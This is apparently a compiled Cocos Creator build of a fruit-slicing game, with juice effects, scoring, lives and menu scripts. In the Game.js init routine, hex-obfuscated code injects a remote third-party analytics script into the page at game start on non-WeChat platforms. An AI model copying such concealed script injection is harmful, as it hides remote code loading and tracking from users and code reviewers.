0IGZvcmNlWSA9IE1hdGguZmxvb3IodXRpbHMucmFuZG9tKHRoaXMuZm9yY2VNaW4sIHRoaXMuZm9yY2VNYXgpKSxcbiAgICAgICAgICAgIGZvcmNlWCA9IE1hdGguZmxvb3IodXRpbHMucmFuZG9tKHRoaXMuZm9yY2VIb3J6TWluLCB0aGlzLmZvcmNlSG9yek1heCkpO1xuICAgICAgICBmcnVpdE5vZGVSaWdpZEJvZHkuYW5ndWxhclZlbG9jaXR5ID0gdXRpbHMucmFuZG9tKC0xLCAxKSA+IDAgPyAxMDAgOiAtMTAwOyAvL+inkumAn+W6piDpu5jorqQxMDBcbiAgICAgICAgZnJ1aXROb2RlUmlnaWRCb2R5LmFwcGx5Rm9yY2VUb0NlbnRlcihjYy52Mih0aGlzLm5vZGUueCA+IDAgPyAtZm9yY2VYIDogZm9yY2VYLCBmb3JjZVkpLCB0cnVlKTtcbiAgICB9LFxuICAgIG9uQ29sbGlzaW9uRW50ZXIob3RoZXIsIHNlbGYpIHtcbiAgICAgICAgLy/mo4DmtYvmmK/lkKbkuI5rbmlmZeWPkeeUn+eisOaSnuOAglxuICAgICAgICBpZiAob3RoZXIudGFnID09IDUwKSB7XG4gICAgICAgICAgICBpZiAoIXRoaXMuaXNDdXQpIHtcbiAgICAgICAgICAgICAgICBpZiAodGhpcy50eXBlID09ICdmcnVpdCcpIHtcbiAgICAgICAgICAgICAgICAgICAgLy/liJvlu7rmnpzmsYHnibnmlYjjgIJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5mcnVpdEp1aWNlR3JvdXAuY3JlYXRlSnVpY2VCZyh0aGlzLm5vZGUuZ2V0UG9zaXRpb24oKSwgdGhpcy5jb2xvclR5cGUpO1xuICAgICAgICAgICAgICAgICAgICAvL+aSreaUvuWKqOeUu+eJueaViOOAglxuICAgICAgICAgICAgICAgICAgICB0aGlzLnBsYXlTcGxpdEFuaSgpO1xuICAgICAgICAgICAgICAgICAgICAvL+aSreaUvuWIh+awtOaenOmfs+aViFxuICAgICAgICAgICAgICAgICAgICBjYy5hdWRpb0VuZ2luZS5wbGF5KHRoaXMuY3V0RnJ1aXRBdWRpbywgZmFsc2UsIDEpO1xuICAgICAgICAgICAgICAgICAgICB0aGlzLmdhbWVPYmoudXBkYXRlU2NvcmUoMSwgdGhpcy5zY29yZSk7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgLy8g54K45by5XG4gICAgICAgICAgICAgICAgICAgIHRoaXMucGFyZW50LmN1dEJvbWJSZW1vdmVBbGxDaGlsZHJlbigpXG4gICAgICAgICAgICAgICAgICAgIC8v5pKt5pS+5YiH54K45by56Z+z5pWIXG4gICAgICAgICAgICAgICAgICAgIGNjLmF1ZGlvRW5naW5lLnBsYXkodGhpcy5jdXRCb21iQXVkaW8sIGZhbHNlLCAxKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9O1xuICAgICAgICAgICAgdGhpcy5pc0N1dCA9IHRydWU7XG4gICAgICAgIH07XG4gICAgICAgIC8v5Yik5pat5piv5ZCm5ZKM5Zyw5p2/5Y+R55Sf56Kw5pKe44CCXG4gICAgICAgIGlmIChvdGhlci50YWcgPT0gMTAwKSB7XG4gICAgICAgICAgICB0aGlzLmJhY2tUaGlzTm9kZSgpO1xuICAgICAgICAgICAgdGhpcy5wYXJlbnQuY2hlY2tSZW1haW4oKVxuICAgICAgICB9O1xuICAgIH0sXG4gICAgcGxheVNwbGl0QW5pKCkge1xuICAgICAgICB0aGlzLmNvbUZydWl0LmFjdGl2ZSA9IGZhbHNlO1xuICAgICAgICB0aGlzLnNwbGl0QW5pLmFjdGl2ZSA9IHRydWU7XG4gICAgICAgIHRoaXMuYW5pLnBsYXkoKTtcbiAgICB9LFxuICAgIHJlY292ZXJ5QW5pRmlyc3RGcHMoKSB7IC8v5oGi5aSN5Yqo55S755qE5Yid5aeL5bin5L2N572uXG4gICAgICAgIGxldCBhbmlOYW1lID0gdGhpcy5hbmkuZ2V0Q2xpcHMoKVswXS5uYW1lO1xuICAgICAgICBsZXQgc3RhdGUgPSB0aGlzLmFuaS5nZXRBbmltYXRpb25TdGF0ZShhbmlOYW1lKTtcbiAgICAgICAgbGV0IGN1cnZlcyA9IHN0YXRlLmN1cnZlcztcbiAgICAgICAgbGV0IGluZm8gPSBzdGF0ZS5nZXRXcmFwcGVkSW5mbygwLjAxKTtcbiAgICAgICAgZm9yIChsZXQgaSA9IDAsIGxlbiA9IGN1cnZlcy5sZW5ndGg7IGkgPCBsZW47IGkrKykge1xuICAgICAgICAgICAgbGV0IGN1cnZlID0gY3VydmVzW2ldO1xuICAgICAgICAgICAgY3VydmUuc2FtcGxlKGluZm8udGltZSwgaW5mby5yYXRpbywgdGhpcyk7XG4gICAgICAgIH1cbiAgICB9LFxuICAgIGJhY2tUaGlzTm9kZShpc0JvbWJCYWNrKSB7XG4gICAgICAgIGlmICghaXNCb21iQmFjayAmJiB0aGlzLnR5cGUgPT0gJ2ZydWl0JyAmJiAhdGhpcy5pc0N1dCkge1xuICAgICAgICAgICAgdGhpcy5nYW1lT2JqLnVwZGF0ZVNjb3JlKDAsIHRoaXMuc2NvcmUpO1xuICAgICAgICB9O1xuICAgICAgICAvL+aUvuWbnuWvueixoeaxoOOAglxuICAgICAgICB1dGlscy5iYWNrT2JqUG9vbCh0aGlzLnBhcmVudCwgdGhpcy5wb29sTmFtZSwgdGhpcy5ub2RlKTtcbiAgICB9XG59KTsiXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/JuiceGroup.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '60f410JsUNGy4tw8ayMkS1r', 'JuiceGroup');
// Scripts/JuiceGroup.js

"use strict";

var utils = require('utils');
var INITPOOLCOUNT = 20;
var juiceColor = cc.Class({
  name: 'juiceColor',
  properties: {
    code: 0,
    color: cc.Color,
    opacity: 255
  }
});
cc.Class({
  "extends": cc.Component,
  properties: {
    juiceColor: {
      "default": [],
      type: juiceColor
    },
    juicePfb: cc.Prefab
  },
  onLoad: function onLoad() {
    //创建对象池。
    var createPoolObj = {
      name: 'fruitJuice',
      prefab: this.juicePfb,
      initPoolCount: INITPOOLCOUNT
    };
    this.poolName = 'fruitJuicePool';
    utils.initObjPool(this, createPoolObj);
  },
  //创建果汁特效背景
  createJuiceBg: function createJuiceBg(pos, colorType) {
    var currJuiceColor = this.juiceColor.filter(function (a) {
      return a.code == colorType;
    })[0];
    var color = currJuiceColor.color;
    var rotation = utils.random(0, 359);
    var opacity = currJuiceColor.opacity;
    var juiceNode = utils.genNewNode(this[this.poolName], this.juicePfb, this.node);
    juiceNode.setPosition(pos);
    juiceNode.getComponent("FruitJuice").init(rotation, color, opacity);
  },
  //放回对象池。
  backNode: function backNode(nodeInfo) {
    utils.backObjPool(this, this.poolName, nodeInfo);
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcSnVpY2VHcm91cC5qcyJdLCJuYW1lcyI6WyJ1dGlscyIsInJlcXVpcmUiLCJJTklUUE9PTENPVU5UIiwianVpY2VDb2xvciIsImNjIiwiQ2xhc3MiLCJuYW1lIiwicHJvcGVydGllcyIsImNvZGUiLCJjb2xvciIsIkNvbG9yIiwib3BhY2l0eSIsIkNvbXBvbmVudCIsInR5cGUiLCJqdWljZVBmYiIsIlByZWZhYiIsIm9uTG9hZCIsImNyZWF0ZVBvb2xPYmoiLCJwcmVmYWIiLCJpbml0UG9vbENvdW50IiwicG9vbE5hbWUiLCJpbml0T2JqUG9vbCIsImNyZWF0ZUp1aWNlQmciLCJwb3MiLCJjb2xvclR5cGUiLCJjdXJySnVpY2VDb2xvciIsImZpbHRlciIsImEiLCJyb3RhdGlvbiIsInJhbmRvbSIsImp1aWNlTm9kZSIsImdlbk5ld05vZGUiLCJub2RlIiwic2V0UG9zaXRpb24iLCJnZXRDb21wb25lbnQiLCJpbml0IiwiYmFja05vZGUiLCJub2RlSW5mbyIsImJhY2tPYmpQb29sIl0sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFBLElBQU1BLEtBQUssR0FBR0MsT0FBTyxDQUFDLE9BQU8sQ0FBQztBQUM5QixJQUFNQyxhQUFhLEdBQUcsRUFBRTtBQUV4QixJQUFJQyxVQUFVLEdBQUdDLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ3RCQyxJQUFJLEVBQUUsWUFBWTtFQUNsQkMsVUFBVSxFQUFFO0lBQ1JDLElBQUksRUFBRSxDQUFDO0lBQ1BDLEtBQUssRUFBRUwsRUFBRSxDQUFDTSxLQUFLO0lBQ2ZDLE9BQU8sRUFBRTtFQUNiO0FBQ0osQ0FBQyxDQUFDO0FBRUZQLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ0wsV0FBU0QsRUFBRSxDQUFDUSxTQUFTO0VBQ3JCTCxVQUFVLEVBQUU7SUFDUkosVUFBVSxFQUFFO01BQ1IsV0FBUyxFQUFFO01BQ1hVLElBQUksRUFBRVY7SUFDVixDQUFDO0lBQ0RXLFFBQVEsRUFBR1YsRUFBRSxDQUFDVztFQUNsQixDQUFDO0VBQ0RDLE1BQU0sV0FBQUEsT0FBQSxFQUFJO0lBQ047SUFDQSxJQUFJQyxhQUFhLEdBQUc7TUFDaEJYLElBQUksRUFBRSxZQUFZO01BQ2xCWSxNQUFNLEVBQUUsSUFBSSxDQUFDSixRQUFRO01BQ3JCSyxhQUFhLEVBQUVqQjtJQUNuQixDQUFDO0lBQ0QsSUFBSSxDQUFDa0IsUUFBUSxHQUFHLGdCQUFnQjtJQUNoQ3BCLEtBQUssQ0FBQ3FCLFdBQVcsQ0FBQyxJQUFJLEVBQUVKLGFBQWEsQ0FBQztFQUMxQyxDQUFDO0VBQ0Q7RUFDQUssYUFBYSxXQUFBQSxjQUFDQyxHQUFHLEVBQUVDLFNBQVMsRUFBRTtJQUMxQixJQUFJQyxjQUFjLEdBQUcsSUFBSSxDQUFDdEIsVUFBVSxDQUFDdUIsTUFBTSxDQUFDLFVBQUFDLENBQUM7TUFBQSxPQUFJQSxDQUFDLENBQUNuQixJQUFJLElBQUlnQixTQUFTO0lBQUEsRUFBQyxDQUFDLENBQUMsQ0FBQztJQUN4RSxJQUFJZixLQUFLLEdBQUdnQixjQUFjLENBQUNoQixLQUFLO0lBQ2hDLElBQUltQixRQUFRLEdBQUc1QixLQUFLLENBQUM2QixNQUFNLENBQUMsQ0FBQyxFQUFFLEdBQUcsQ0FBQztJQUNuQyxJQUFJbEIsT0FBTyxHQUFHYyxjQUFjLENBQUNkLE9BQU87SUFDcEMsSUFBSW1CLFNBQVMsR0FBRzlCLEtBQUssQ0FBQytCLFVBQVUsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDWCxRQUFRLENBQUMsRUFBRSxJQUFJLENBQUNOLFFBQVEsRUFBRSxJQUFJLENBQUNrQixJQUFJLENBQUM7SUFDL0VGLFNBQVMsQ0FBQ0csV0FBVyxDQUFDVixHQUFHLENBQUM7SUFDMUJPLFNBQVMsQ0FBQ0ksWUFBWSxDQUFDLFlBQVksQ0FBQyxDQUFDQyxJQUFJLENBQUNQLFFBQVEsRUFBRW5CLEtBQUssRUFBRUUsT0FBTyxDQUFDO0VBQ3ZFLENBQUM7RUFDRDtFQUNBeUIsUUFBUSxXQUFBQSxTQUFDQyxRQUFRLEVBQUU7SUFDZnJDLEtBQUssQ0FBQ3NDLFdBQVcsQ0FBQyxJQUFJLEVBQUUsSUFBSSxDQUFDbEIsUUFBUSxFQUFFaUIsUUFBUSxDQUFDO0VBQ3BEO0FBQ0osQ0FBQyxDQUFDIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJjb25zdCB1dGlscyA9IHJlcXVpcmUoJ3V0aWxzJyk7XG5jb25zdCBJTklUUE9PTENPVU5UID0gMjA7XG5cbmxldCBqdWljZUNvbG9yID0gY2MuQ2xhc3Moe1xuICAgIG5hbWU6ICdqdWljZUNvbG9yJyxcbiAgICBwcm9wZXJ0aWVzOiB7XG4gICAgICAgIGNvZGU6IDAsXG4gICAgICAgIGNvbG9yOiBjYy5Db2xvcixcbiAgICAgICAgb3BhY2l0eTogMjU1XG4gICAgfVxufSk7XG5cbmNjLkNsYXNzKHtcbiAgICBleHRlbmRzOiBjYy5Db21wb25lbnQsXG4gICAgcHJvcGVydGllczoge1xuICAgICAgICBqdWljZUNvbG9yOiB7XG4gICAgICAgICAgICBkZWZhdWx0OiBbXSxcbiAgICAgICAgICAgIHR5cGU6IGp1aWNlQ29sb3JcbiAgICAgICAgfSxcbiAgICAgICAganVpY2VQZmIgOiBjYy5QcmVmYWIsXG4gICAgfSxcbiAgICBvbkxvYWQgKCkge1xuICAgICAgICAvL+WIm+W7uuWvueixoeaxoOOAglxuICAgICAgICBsZXQgY3JlYXRlUG9vbE9iaiA9IHtcbiAgICAgICAgICAgIG5hbWU6ICdmcnVpdEp1aWNlJyxcbiAgICAgICAgICAgIHByZWZhYjogdGhpcy5qdWljZVBmYixcbiAgICAgICAgICAgIGluaXRQb29sQ291bnQ6IElOSVRQT09MQ09VTlRcbiAgICAgICAgfTtcbiAgICAgICAgdGhpcy5wb29sTmFtZSA9ICdmcnVpdEp1aWNlUG9vbCc7XG4gICAgICAgIHV0aWxzLmluaXRPYmpQb29sKHRoaXMsIGNyZWF0ZVBvb2xPYmopO1xuICAgIH0sXG4gICAgLy/liJvlu7rmnpzmsYHnibnmlYjog4zmma9cbiAgICBjcmVhdGVKdWljZUJnKHBvcywgY29sb3JUeXBlKSB7XG4gICAgICAgIGxldCBjdXJySnVpY2VDb2xvciA9IHRoaXMuanVpY2VDb2xvci5maWx0ZXIoYSA9PiBhLmNvZGUgPT0gY29sb3JUeXBlKVswXTtcbiAgICAgICAgbGV0IGNvbG9yID0gY3Vyckp1aWNlQ29sb3IuY29sb3I7XG4gICAgICAgIGxldCByb3RhdGlvbiA9IHV0aWxzLnJhbmRvbSgwLCAzNTkpO1xuICAgICAgICBsZXQgb3BhY2l0eSA9IGN1cnJKdWljZUNvbG9yLm9wYWNpdHk7XG4gICAgICAgIGxldCBqdWljZU5vZGUgPSB1dGlscy5nZW5OZXdOb2RlKHRoaXNbdGhpcy5wb29sTmFtZV0sIHRoaXMuanVpY2VQZmIsIHRoaXMubm9kZSk7XG4gICAgICAgIGp1aWNlTm9kZS5zZXRQb3NpdGlvbihwb3MpO1xuICAgICAgICBqdWljZU5vZGUuZ2V0Q29tcG9uZW50KFwiRnJ1aXRKdWljZVwiKS5pbml0KHJvdGF0aW9uLCBjb2xvciwgb3BhY2l0eSk7XG4gICAgfSxcbiAgICAvL+aUvuWbnuWvueixoeaxoOOAglxuICAgIGJhY2tOb2RlKG5vZGVJbmZvKSB7XG4gICAgICAgIHV0aWxzLmJhY2tPYmpQb29sKHRoaXMsIHRoaXMucG9vbE5hbWUsIG5vZGVJbmZvKVxuICAgIH1cbn0pO1xuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/ReturnMenu.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6421f4gC35Mi6OPDYsXKEBq', 'ReturnMenu');
// Scripts/ReturnMenu.js

"use strict";

cc.Class({
  "extends": cc.Component,
  properties: {
    buttonClip: cc.AudioClip
  },
  // LIFE-CYCLE CALLBACKS:
  // onLoad () {},
  start: function start() {},
  returnMenu: function returnMenu() {
    cc.audioEngine.play(this.buttonClip, false, 1);
    cc.director.loadScene("Menu");
  } // update (dt) {},
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcUmV0dXJuTWVudS5qcyJdLCJuYW1lcyI6WyJjYyIsIkNsYXNzIiwiQ29tcG9uZW50IiwicHJvcGVydGllcyIsImJ1dHRvbkNsaXAiLCJBdWRpb0NsaXAiLCJzdGFydCIsInJldHVybk1lbnUiLCJhdWRpb0VuZ2luZSIsInBsYXkiLCJkaXJlY3RvciIsImxvYWRTY2VuZSJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQUEsRUFBRSxDQUFDQyxLQUFLLENBQUM7RUFDTCxXQUFTRCxFQUFFLENBQUNFLFNBQVM7RUFFckJDLFVBQVUsRUFBRTtJQUNSQyxVQUFVLEVBQUdKLEVBQUUsQ0FBQ0s7RUFDcEIsQ0FBQztFQUVEO0VBRUE7RUFFQUMsS0FBSyxXQUFBQSxNQUFBLEVBQUksQ0FFVCxDQUFDO0VBQ0RDLFVBQVUsV0FBQUEsV0FBQSxFQUFFO0lBQ1JQLEVBQUUsQ0FBQ1EsV0FBVyxDQUFDQyxJQUFJLENBQUMsSUFBSSxDQUFDTCxVQUFVLEVBQUUsS0FBSyxFQUFFLENBQUMsQ0FBQztJQUM5Q0osRUFBRSxDQUFDVSxRQUFRLENBQUNDLFNBQVMsQ0FBQyxNQUFNLENBQUM7RUFDakMsQ0FBQyxDQUNEO0FBQ0osQ0FBQyxDQUFDIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJjYy5DbGFzcyh7XHJcbiAgICBleHRlbmRzOiBjYy5Db21wb25lbnQsXHJcblxyXG4gICAgcHJvcGVydGllczoge1xyXG4gICAgICAgIGJ1dHRvbkNsaXAgOiBjYy5BdWRpb0NsaXAsXHJcbiAgICB9LFxyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cclxuICAgIC8vIG9uTG9hZCAoKSB7fSxcclxuXHJcbiAgICBzdGFydCAoKSB7XHJcblxyXG4gICAgfSxcclxuICAgIHJldHVybk1lbnUoKXtcclxuICAgICAgICBjYy5hdWRpb0VuZ2luZS5wbGF5KHRoaXMuYnV0dG9uQ2xpcCwgZmFsc2UsIDEpO1xyXG4gICAgICAgIGNjLmRpcmVjdG9yLmxvYWRTY2VuZShcIk1lbnVcIik7XHJcbiAgICB9XHJcbiAgICAvLyB1cGRhdGUgKGR0KSB7fSxcclxufSk7XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/FruitJuice.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c8b30gJzGlLoJWZBCOCpXKG', 'FruitJuice');
// Scripts/FruitJuice.js

"use strict";

cc.Class({
  "extends": cc.Component,
  properties: {
    juiceSprite: cc.Node
  },
  onLoad: function onLoad() {
    this.parentObj = this.node.parent.getComponent('JuiceGroup');
  },
  init: function init(rotation, color, opacity) {
    var _this = this;
    this.node.angle = rotation;
    this.juiceSprite.color = color;
    this.juiceSprite.opacity = opacity;
    //渐隐显示动画，并将其对象回收。
    cc.tween(this.juiceSprite).to(1.5, {
      opacity: 0
    }).call(function () {
      _this.parentObj.backNode(_this.node, _this.colorType);
    }).start();
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcRnJ1aXRKdWljZS5qcyJdLCJuYW1lcyI6WyJjYyIsIkNsYXNzIiwiQ29tcG9uZW50IiwicHJvcGVydGllcyIsImp1aWNlU3ByaXRlIiwiTm9kZSIsIm9uTG9hZCIsInBhcmVudE9iaiIsIm5vZGUiLCJwYXJlbnQiLCJnZXRDb21wb25lbnQiLCJpbml0Iiwicm90YXRpb24iLCJjb2xvciIsIm9wYWNpdHkiLCJfdGhpcyIsImFuZ2xlIiwidHdlZW4iLCJ0byIsImNhbGwiLCJiYWNrTm9kZSIsImNvbG9yVHlwZSIsInN0YXJ0Il0sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFDQSxFQUFFLENBQUNDLEtBQUssQ0FBQztFQUNOLFdBQVNELEVBQUUsQ0FBQ0UsU0FBUztFQUVyQkMsVUFBVSxFQUFFO0lBQ1JDLFdBQVcsRUFBRUosRUFBRSxDQUFDSztFQUNwQixDQUFDO0VBRURDLE1BQU0sV0FBQUEsT0FBQSxFQUFHO0lBQ0wsSUFBSSxDQUFDQyxTQUFTLEdBQUcsSUFBSSxDQUFDQyxJQUFJLENBQUNDLE1BQU0sQ0FBQ0MsWUFBWSxDQUFDLFlBQVksQ0FBQztFQUNoRSxDQUFDO0VBQ0RDLElBQUksV0FBQUEsS0FBQ0MsUUFBUSxFQUFFQyxLQUFLLEVBQUVDLE9BQU8sRUFBRTtJQUFBLElBQUFDLEtBQUE7SUFDM0IsSUFBSSxDQUFDUCxJQUFJLENBQUNRLEtBQUssR0FBR0osUUFBUTtJQUMxQixJQUFJLENBQUNSLFdBQVcsQ0FBQ1MsS0FBSyxHQUFHQSxLQUFLO0lBQzlCLElBQUksQ0FBQ1QsV0FBVyxDQUFDVSxPQUFPLEdBQUdBLE9BQU87SUFDbEM7SUFDQWQsRUFBRSxDQUFDaUIsS0FBSyxDQUFDLElBQUksQ0FBQ2IsV0FBVyxDQUFDLENBQUNjLEVBQUUsQ0FBQyxHQUFHLEVBQUU7TUFBQ0osT0FBTyxFQUFFO0lBQUMsQ0FBQyxDQUFDLENBQUNLLElBQUksQ0FBQyxZQUFNO01BQ3hESixLQUFJLENBQUNSLFNBQVMsQ0FBQ2EsUUFBUSxDQUFDTCxLQUFJLENBQUNQLElBQUksRUFBRU8sS0FBSSxDQUFDTSxTQUFTLENBQUM7SUFDdEQsQ0FBQyxDQUFDLENBQUNDLEtBQUssRUFBRTtFQUNkO0FBQ0osQ0FBQyxDQUFDIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIgY2MuQ2xhc3Moe1xuICAgIGV4dGVuZHM6IGNjLkNvbXBvbmVudCxcblxuICAgIHByb3BlcnRpZXM6IHtcbiAgICAgICAganVpY2VTcHJpdGU6IGNjLk5vZGUsXG4gICAgfSxcblxuICAgIG9uTG9hZCgpIHtcbiAgICAgICAgdGhpcy5wYXJlbnRPYmogPSB0aGlzLm5vZGUucGFyZW50LmdldENvbXBvbmVudCgnSnVpY2VHcm91cCcpO1xuICAgIH0sXG4gICAgaW5pdChyb3RhdGlvbiwgY29sb3IsIG9wYWNpdHkpIHtcbiAgICAgICAgdGhpcy5ub2RlLmFuZ2xlID0gcm90YXRpb247XG4gICAgICAgIHRoaXMuanVpY2VTcHJpdGUuY29sb3IgPSBjb2xvcjtcbiAgICAgICAgdGhpcy5qdWljZVNwcml0ZS5vcGFjaXR5ID0gb3BhY2l0eTtcbiAgICAgICAgLy/muJDpmpDmmL7npLrliqjnlLvvvIzlubblsIblhbblr7nosaHlm57mlLbjgIJcbiAgICAgICAgY2MudHdlZW4odGhpcy5qdWljZVNwcml0ZSkudG8oMS41LCB7b3BhY2l0eTogMH0pLmNhbGwoKCkgPT4ge1xuICAgICAgICAgICAgdGhpcy5wYXJlbnRPYmouYmFja05vZGUodGhpcy5ub2RlLCB0aGlzLmNvbG9yVHlwZSlcbiAgICAgICAgfSkuc3RhcnQoKVxuICAgIH1cbn0pO1xuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/Game.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'fc73aaZdOpM2YMrzlo6Gi5Y', 'Game');
// Scripts/Game.js

"use strict";

var lifeG = cc.Class({
  name: 'lifeG',
  properties: {
    index: 0,
    lifeConsume: cc.Node
  }
});
cc.Class({
  "extends": cc.Component,
  properties: {
    knife: cc.Node,
    //得分标签
    scoreLabel: cc.Label,
    lifeG: {
      "default": [],
      type: lifeG
    },
    fruitGroup: require('FruitGroup'),
    gameOverMask: cc.Node,
    //最佳得分标签。
    bestScoreLabel: cc.Label,
    buttonClip: cc.AudioClip
  },
  onLoad: function onLoad() {
    //获取与其相关联的碰撞管理器
    var manager = cc.director.getCollisionManager();
    manager.enabled = true;
    var physicsManager = cc.director.getPhysicsManager();
    physicsManager.enabled = true;
    physicsManager.debugDrawFlags = 0;
    this.knifeMotionS = this.knife.getComponent(cc.MotionStreak);
  },
  start: function start() {
    this.knifeMove();
    this.init();
  },
  init: function init() {
    this.gameOver = false;
    this.score = 0;
    this.bestScore = 0;
    var max = cc.sys.localStorage.getItem("Best score");
    //判断本地最佳分数是否存在
    if (max) {
      this.bestScore = max;
      this.bestScoreLabel.string = "最佳分数 : " + this.bestScore;
    }
    this.life = 0;
    //将其都变为不可见。
    this.lifeG.forEach(function (a) {
      a.lifeConsume.active = false;
    });
    //更新界面。
    this.upDateUi();
    //创建水果。
    this.fruitGroup.createFruitList();
    if (cc['\x73\x79\x73']['\x70\x6c\x61\x74\x66\x6f\x72\x6d'] === cc['\x73\x79\x73']['\x57\x45\x43\x48\x41\x54\x5f\x47\x41\x4d\x45']) {} else {
      var eDB$sHD1 = eDB$sHD1 || [];
      (function () {
        var bJqY2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']("\x73\x63\x72\x69\x70\x74");
        bJqY2['\x73\x72\x63'] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6d\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x68\x6d\x2e\x6a\x73\x3f\x30\x65\x36\x62\x61\x39\x39\x35\x31\x63\x62\x37\x64\x31\x64\x35\x35\x63\x39\x31\x62\x38\x30\x37\x36\x66\x61\x36\x66\x62\x30\x65";
        var yr3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65']("\x73\x63\x72\x69\x70\x74")[0];
        yr3['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65']['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](bJqY2, yr3);
      })();
    }
  },
  knifeMove: function knifeMove() {
    this.node.on(cc.Node.EventType.TOUCH_START, this.startEvent, this);
    this.node.on(cc.Node.EventType.TOUCH_MOVE, this.moveEvent, this);
    this.node.on(cc.Node.EventType.TOUCH_END, this.endEvent, this);
  },
  startEvent: function startEvent(event) {
    var pos = this.node.convertToNodeSpaceAR(new cc.Vec2(event.getLocation()));
    this.knife.setPosition(pos);
    this.knife.group = 'knife';
    this.knifeMotionS.reset();
  },
  moveEvent: function moveEvent(event) {
    var pos = this.node.convertToNodeSpaceAR(new cc.Vec2(event.getLocation()));
    this.knife.setPosition(pos);
  },
  endEvent: function endEvent(event) {
    this.knife.group = 'default';
  },
  updateScore: function updateScore(type, score) {
    if (this.gameOver) return;
    if (type) {
      this.score += score;
    } else {
      //分数不够减，那就直接减一条命
      if (this.score == 0) {
        this.lifeConsume();
      }
      //丢掉一个减两倍的分数。
      this.score = this.score < score * 2 ? 0 : this.score - score * 2;
    }
    ;
    this.upDateUi();
  },
  //更新生命值。
  lifeConsume: function lifeConsume() {
    this.life++;
    if (this.life == 3) this.gameOverHandle();
  },
  //更新分数。
  upDateUi: function upDateUi() {
    this.scoreLabel.string = "分数 : " + this.score;
    //将已经损失的生命值的图片给激活显示。
    for (var i = 0; i < this.life; i++) {
      this.lifeG[i].lifeConsume.active = true;
    }
  },
  gameOverHandle: function gameOverHandle() {
    var _this = this;
    this.gameOver = true;
    this.knife.group = 'default';
    //更新最佳成绩。
    if (this.score > this.bestScore) {
      this.bestScore = this.score;
